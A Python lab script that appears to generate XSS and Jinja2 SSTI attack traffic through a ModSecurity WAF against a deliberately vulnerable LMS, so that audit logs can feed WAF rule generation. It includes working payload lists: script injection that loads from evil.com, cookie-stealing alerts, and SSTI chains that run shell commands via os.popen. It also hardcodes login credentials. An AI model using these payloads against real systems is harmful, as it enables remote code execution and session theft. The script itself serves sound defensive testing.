#!/usr/bin/env python3
"""
attackScript_xss_ssti.py
========================
Generate XSS and SSTI attack traffic against the vulnerable LMS target
*through the XAF WAF*, so that ModSecurity writes real entries into
modsec-logs/audit.log for the clustering / rule-generation pipeline.

Lab use only. Target the WAF proxy (:8080), NOT the LMS directly (:5000).

Attack sinks:
  GET  /xss-search?q=   — reflected XSS via unescaped query param
  POST /feedback        — SSTI via Jinja2 render_template_string(user_input)

Usage
-----
    python3 attackScript_xss_ssti.py
    python3 attackScript_xss_ssti.py --url http://localhost:8080 --rounds 5 --delay 0.3
    python3 attackScript_xss_ssti.py --no-benign
    python3 attackScript_xss_ssti.py --type xss        # XSS payloads only
    python3 attackScript_xss_ssti.py --type ssti       # SSTI payloads only

After it runs, inspect the log:
    tail -n 20 ~/Desktop/XAF/modsec-logs/audit.log
"""

import argparse
import random
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from collections import Counter

# ---------------------------------------------------------------------------
# Credentials to obtain a session cookie (needed for authenticated endpoints)
# ---------------------------------------------------------------------------
LOGIN_USER = "student1"
LOGIN_PASS = "pass123"

# ---------------------------------------------------------------------------
# Payload sets
# ---------------------------------------------------------------------------
XSS_PAYLOADS = {
    "script_tag": [
        "<script>alert(1)</script>",
        "<script>alert(document.cookie)</script>",
        "<SCRIPT>alert('xss')</SCRIPT>",
        "<script src=//evil.com/x.js></script>",
    ],
    "event_handler": [
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ],
    "javascript_uri": [
        "<a href=javascript:alert(1)>click</a>",
        "<iframe src=javascript:alert(1)>",
        "javascript:alert(document.domain)",
    ],
    "encoded": [
        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "<scr\x00ipt>alert(1)</scr\x00ipt>",
        "<img src=x o\x00nerror=alert(1)>",
    ],
    "obfuscated": [
        "<ScRiPt>alert(1)</sCrIpT>",
        "<svg/onload=alert(1)>",
        "<<script>alert(1)//<</script>",
        "<img src=\"x\" onerror=\"alert(1)\">",
        "'><script>alert(String.fromCharCode(88,83,83))</script>",
    ],
}

SSTI_PAYLOADS = {
    "probe": [
        "{{7*7}}",
        "{{7*'7'}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
    ],
    "info_leak": [
        "{{config}}",
        "{{config.items()}}",
        "{{request.environ}}",
        "{{self.__dict__}}",
        "{{g}}",
    ],
    "class_traversal": [
        "{{''.__class__.__mro__}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{().__class__.__bases__[0].__subclasses__()}}",
        "{{[].__class__.__mro__[-1].__subclasses__()}}",
    ],
    "rce": [
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{%for x in ().__class__.__base__.__subclasses__()%}{%if 'warning' in x.__name__%}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}",
        "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
    ],
    "obfuscated": [
        "{{''.join(['_','_','c','l','a','s','s','_','_'])}}",
        "{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}",
        "{%set x='__cla'+'ss__'%}{{''|attr(x)}}",
        "{{lipsum.__globals__.os.popen('id').read()}}",
    ],
}

BENIGN_PAYLOADS = [
    "python programming",
    "database systems",
    "great course, very helpful!",
    "I enjoyed the lab sessions.",
    "please add more exercises",
    "hello world",
    "networking fundamentals",
]


# ---------------------------------------------------------------------------
# HTTP helpers
# ---------------------------------------------------------------------------
def make_opener():
    """Return an opener that follows redirects and stores cookies."""
    jar = urllib.request.HTTPCookieProcessor()
    return urllib.request.build_opener(jar)


def do_login(opener, base):
    """Authenticate through the WAF and store the session cookie in opener."""
    body = urllib.parse.urlencode({"username": LOGIN_USER, "password": LOGIN_PASS}).encode()
    req = urllib.request.Request(
        f"{base}/login",
        data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded",
                 "User-Agent": "xaf-attack-sim/2.0"},
        method="POST",
    )
    try:
        with opener.open(req, timeout=10):
            pass
        return True
    except Exception as exc:
        print(f"[!] Login failed: {exc}")
        return False


def do_request(opener, url, data=None):
    """Send one request; return the HTTP status code."""
    method = "POST" if data is not None else "GET"
    req = urllib.request.Request(
        url, data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded",
                 "User-Agent": "xaf-attack-sim/2.0"},
        method=method,
    )
    try:
        with opener.open(req, timeout=10) as resp:
            return resp.status
    except urllib.error.HTTPError as e:
        return e.code
    except urllib.error.URLError as e:
        return f"ERR:{e.reason}"


# ---------------------------------------------------------------------------
# Attack functions
# ---------------------------------------------------------------------------
def attack_xss_search(opener, base, payload):
    """GET /xss-search?q=<payload>"""
    qs = urllib.parse.urlencode({"q": payload})
    return do_request(opener, f"{base}/xss-search?{qs}")


def attack_ssti_feedback(opener, base, payload):
    """POST /feedback with message=<payload>"""
    body = urllib.parse.urlencode({"message": payload}).encode()
    return do_request(opener, f"{base}/feedback", data=body)


def attack_benign_search(opener, base, payload):
    """GET /xss-search?q=<benign> — false-positive baseline."""
    qs = urllib.parse.urlencode({"q": payload})
    return do_request(opener, f"{base}/xss-search?{qs}")


def attack_benign_feedback(opener, base, payload):
    """POST /feedback with benign message — false-positive baseline."""
    body = urllib.parse.urlencode({"message": payload}).encode()
    return do_request(opener, f"{base}/feedback", data=body)


# ---------------------------------------------------------------------------
# Task builders
# ---------------------------------------------------------------------------
def build_tasks(attack_type, include_benign):
    tasks = []

    if attack_type in ("xss", "all"):
        for family, payloads in XSS_PAYLOADS.items():
            for p in payloads:
                tasks.append(("xss", family, "xss_search", p,
                               lambda op, base, p=p: attack_xss_search(op, base, p)))

    if attack_type in ("ssti", "all"):
        for family, payloads in SSTI_PAYLOADS.items():
            for p in payloads:
                tasks.append(("ssti", family, "feedback", p,
                               lambda op, base, p=p: attack_ssti_feedback(op, base, p)))

    if include_benign:
        for p in BENIGN_PAYLOADS:
            tasks.append(("benign", "benign", "xss_search", p,
                           lambda op, base, p=p: attack_benign_search(op, base, p)))
            tasks.append(("benign", "benign", "feedback", p,
                           lambda op, base, p=p: attack_benign_feedback(op, base, p)))

    return tasks


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser(
        description="XSS + SSTI attack-traffic generator for the XAF WAF lab."
    )
    ap.add_argument("--url", default="http://localhost:8080",
                    help="Base URL of the WAF proxy (default: http://localhost:8080)")
    ap.add_argument("--rounds", type=int, default=3,
                    help="How many times to cycle through the full payload set (default: 3)")
    ap.add_argument("--delay", type=float, default=0.25,
                    help="Seconds between requests (default: 0.25)")
    ap.add_argument("--no-benign", action="store_true",
                    help="Skip benign baseline traffic")
    ap.add_argument("--type", choices=["xss", "ssti", "all"], default="all",
                    help="Which attack type to send (default: all)")
    args = ap.parse_args()

    base = args.url.rstrip("/")
    if ":5000" in base:
        print("WARNING: :5000 hits the LMS directly — nothing logged by ModSecurity. Use :8080.\n")

    opener = make_opener()
    print(f"Logging in as {LOGIN_USER} through {base} ...", end=" ")
    if not do_login(opener, base):
        print("Aborting.")
        sys.exit(1)
    print("OK\n")

    tasks = build_tasks(args.type, include_benign=not args.no_benign)
    total = len(tasks) * args.rounds

    print(f"Target          : {base}")
    print(f"Attack type     : {args.type}")
    print(f"Payload tasks   : {len(tasks)} per round")
    print(f"Rounds          : {args.rounds}")
    print(f"Total requests  : {total}")
    print(f"Delay / request : {args.delay}s\n")

    status_counts = Counter()
    family_blocked = Counter()
    family_total = Counter()
    sent = 0

    try:
        for r in range(1, args.rounds + 1):
            random.shuffle(tasks)
            for attack_type, family, vector, payload, fn in tasks:
                code = fn(opener, base)
                status_counts[code] += 1
                key = f"{attack_type}/{family}"
                family_total[key] += 1
                if code == 403:
                    family_blocked[key] += 1
                sent += 1

                blocked = "BLOCKED" if code == 403 else f"code={code}"
                short = (payload[:42] + "…") if len(payload) > 43 else payload
                print(f"[r{r}] {attack_type:<5} {family:<18} {vector:<12} {blocked:<10} {short}")
                time.sleep(args.delay)
    except KeyboardInterrupt:
        print("\nInterrupted — printing partial summary.\n")

    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    print(f"Requests sent : {sent}")

    print("\nBy status code:")
    for code, n in sorted(status_counts.items(), key=lambda kv: str(kv[0])):
        print(f"  {str(code):<10} {n}")

    print("\nBlock rate by family (403 / total):")
    for key in sorted(family_total):
        t = family_total[key]
        b = family_blocked.get(key, 0)
        pct = (b / t) * 100
        print(f"  {key:<28} {b:>4}/{t:<4} ({pct:5.1f}%)")

    print("\nNow inspect the audit log the WAF just wrote:")
    print("  tail -n 20 ~/Desktop/XAF/modsec-logs/audit.log")


if __name__ == "__main__":
    sys.exit(main())
